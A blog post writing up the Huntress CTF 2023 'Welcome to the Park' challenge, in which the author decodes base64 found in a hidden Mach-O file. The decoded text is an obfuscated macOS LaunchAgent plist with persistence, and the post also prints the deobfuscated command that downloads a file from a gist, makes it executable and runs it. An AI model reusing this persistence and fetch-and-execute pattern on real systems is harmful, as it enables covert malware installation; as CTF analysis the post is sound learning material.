---
title: "Welcome to the Park"
date: 2023-10-21T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Misc', 'Easy']
---

# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Easy Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/who_is_real)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/discord_snowflake_scramble)

### The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him? 

Here we are given 'welcomeToThePark.zip' to download and extract.  


Once extracted, we receive serveral directories to inspect. After some looking around, if we ``` ls -la ``` in the 'welcome' directory, we find a hidden directory '.hidden' that contains a Mach-O file 'welcomeToThePark'. Mach-O (Mach Object) files are a file format used by macOS, iOS, and other Apple operating systems for executables, object code, shared libraries, dynamic libraries, and bundle files. They serve as the executable file format for these systems, similar to ELF on Linux and PE on Windows.  If we run strings on the binary, we recieve some base64 encoded text:
```base64
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
```
This decodes to some obfuscated xml:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.huntress.ctf</string><key>ProgramArguments</key><array><string>/bin/zsh</string><string>-c</string><string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string></array><key>RunAtLoad</key><true /><key>StartInterval</key><integer>14400</integer></dict></plist> 
```
this is just stringing together a command to curl a github site. Here is the deobfuscated command: 
```bash
tmp=$(mktmp /tmp/XXXXXXXX); curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}"; i f [[ -s "${tmp}" ]]; then chmod 777 "${tmp}"; "${tmp}"; fi; rm "${tmp}" | /bin/zsh
```

If we visit the site, we see a picture of John Hammond, and some encoded comments which lead to fake flags. Remembering that the hint in the beginning mentions we are looking for the creator of Jurassic Park, we can download the .jpg. We can then run strings on the image and receive the flag!

![welcome_to_the_park](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/welcome_to_the_park.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/who_is_real)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/discord_snowflake_scramble)